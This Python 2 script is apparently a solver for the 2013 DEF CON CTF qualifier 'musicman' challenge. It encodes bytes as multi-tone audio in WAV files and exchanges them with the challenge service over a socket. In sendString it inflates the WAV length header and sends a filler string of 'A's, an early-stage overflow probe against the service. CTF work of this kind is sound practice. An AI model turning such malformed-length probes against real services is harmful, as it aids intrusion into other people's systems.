#!/usr/bin/env python 

# http://www.geekatwork.de/2013/06/18/2013-def-con-ctf-qualifying-musicman-writeup/

import wave
import struct
from math import sin
import numpy
import matplotlib.pyplot as plt
import socket
import time

SAMPLERATE = 44100
TWOPI = 6.283185307179586

SAMPLESPERSYMBOL = 2105
SAMPLESFORSILENCE = 100

f = [
	0x3A98,	#carrier 			#15kHz
	0x3B92,	#bit 1
	0x3C8C,
	0x3D86,
	0x3E80,
	0x3F7A,
	0x4074,
	0x416E,
	0x4268,	#bit 8
]

def calcCarrier(t):
	return sin(f[0] * TWOPI * t / SAMPLERATE) * 3000

def findFFTPeaks(wv, threshold):
	peaks = []
	previousAmp = 0
	rising = True

	for i in range(len(wv)):
		if wv[i] < previousAmp:
			if rising and wv[i-1] > threshold:
				peaks.append(i-1) #peak found at i-1
			rising = False
		elif wv[i] > previousAmp:
			rising = True

		previousAmp = wv[i]

	return peaks


def magicWaveToFancyString(datMusic):
	(nchannels, sampwidth, framerate, nframes, comptype, compname) = datMusic.getparams()

	received = []

	for i in range(nframes/(SAMPLESPERSYMBOL+SAMPLESFORSILENCE)):
		# print "symbol ", i

		framesamples = []
		for j in range(SAMPLESPERSYMBOL+SAMPLESFORSILENCE):
			frame = struct.unpack("<1h", datMusic.readframes(1))[0]
			#frame -= calcCarrier(j)
			if j < SAMPLESPERSYMBOL:
				framesamples.append(frame)

		wv = numpy.fft.fft(framesamples)
		freqs = numpy.fft.fftfreq(len(wv))
		
		fHertz = []
		for freq in freqs:
			fHertz.append(freq*SAMPLERATE)

		ratzekotz = findFFTPeaks(wv, 30000)
		# for x in ratzekotz:
		# 	print fHertz[x], abs(wv[x])

		value = 0;
		for x in ratzekotz:
			for idx, y in enumerate(f[1:]):
				if abs(fHertz[x] - y) < 100:
					value += 2**idx

		received.append(chr(value))

		# plt.plot(fHertz, abs(wv))
		# plt.show()

	return ''.join(received[8:-8])

def fancyStringToMagicWave(fileObject, datMessage):
	wavfile = wave.open(fileObject, "w")

	#attach pre- and postambel
	message = "\xFF"*8
	message += datMessage
	message += "\xFF"*8
	
	totalSampleCount = len(message) * (SAMPLESPERSYMBOL+SAMPLESFORSILENCE)
	wavfile.setparams((1, 2, SAMPLERATE, totalSampleCount, 'NONE', 'not compressed'))

	for i in range(len(message)):
		#transmit a byte
		for j in range(SAMPLESPERSYMBOL):
			byte = ord(message[i])

			#"carrier" wave
			v = sin(f[0] * TWOPI * j / SAMPLERATE)

			#add frequencies for set bits
			for bit in range(1, 8):
				if (byte >> (bit - 1)) & 1:
					v += sin(f[bit] * TWOPI * j / SAMPLERATE)

			#scale the audio signal up
			v *= 3000
			wavfile.writeframes(struct.pack('h', int(v)))

		#shut the fuck up
		for k in range(SAMPLESFORSILENCE):
			wavfile.writeframes(struct.pack('h', int(0)))


#HOST="musicman.shallweplayaga.me"
HOST="localhost"
PORT=7890

def sendString(sock, string):
	u = open("output.wav", "w")
	fancyStringToMagicWave(u, string)
	u.close()

	abc = bytearray(open("output.wav", "r").read())
	offset = struct.unpack("I", str(abc[40:44]))[0]
	print offset
	offset += 0xF4240
	abc[40:44] = struct.pack("I", offset)
	print offset
	sock.sendall(str(abc))

def readString(sock):
	received = open("received.wav", "w")
	received_wav = sock.recv(8)
	(magic, length) = struct.unpack("II", received_wav)
	while len(received_wav) < length+8:
		received_wav += sock.recv(1024)
	received.write(received_wav)
	received.close()
	
	w = wave.open("received.wav", "r")
	receivedStr = magicWaveToFancyString(w)
	w.close()

	return receivedStr

def main():
	s = socket.socket()
	s.connect((HOST, PORT))
	#s.settimeout(60)

	raw_input()

	print "+++ reading string"
	print readString(s)

	print "+++ sending string"
	sendString(s, "A"*100)

	print "+++ reading string"
	print readString(s)

if __name__ == '__main__':
	main()
